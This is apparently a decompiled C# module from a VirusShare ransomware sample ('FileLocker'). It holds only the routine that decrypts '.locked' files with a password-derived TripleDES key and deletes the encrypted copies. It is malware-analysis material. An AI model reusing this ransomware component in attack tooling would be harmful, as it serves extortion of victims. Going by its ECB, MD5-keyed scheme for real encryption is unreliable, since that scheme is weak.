// Decompiled with JetBrains decompiler
// Type: FileLocker.DecodeFiles
// Assembly: FileLocker, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4E5EE51A-6914-4180-A10A-8B6B85AFF127
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\Trojan-Ransom.Win32.Blocker.ibjo-459a487b0ad80fc56c06fca73eb80b3268bd423eaf6da5a1b400a7b5c19fb957.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace FileLocker
{
  [StandardModule]
  public sealed class DecodeFiles
  {
    public static string Password;

    public static string tdsDecode(string string_0, string string_1, bool bool_0 = false)
    {
      TripleDESCryptoServiceProvider cryptoServiceProvider1 = new TripleDESCryptoServiceProvider();
      MD5CryptoServiceProvider cryptoServiceProvider2 = new MD5CryptoServiceProvider();
      cryptoServiceProvider1.Key = cryptoServiceProvider2.ComputeHash(Encoding.ASCII.GetBytes(string_1));
      cryptoServiceProvider1.Mode = CipherMode.ECB;
      ICryptoTransform decryptor = cryptoServiceProvider1.CreateDecryptor();
      byte[] inputBuffer = Convert.FromBase64String(string_0);
      return Encoding.ASCII.GetString(decryptor.TransformFinalBlock(inputBuffer, 0, inputBuffer.Length));
    }

    public static void Decode_File(string string_0)
    {
      try
      {
        byte[] array = Convert.FromBase64String(DecodeFiles.tdsDecode(File.ReadAllText(string_0), DecodeFiles.Password));
        FileStream fileStream = new FileStream(string_0.Replace(".locked", ""), FileMode.Create);
        fileStream.Write(array, 0, array.Length);
        fileStream.Close();
        File.Delete(string_0);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
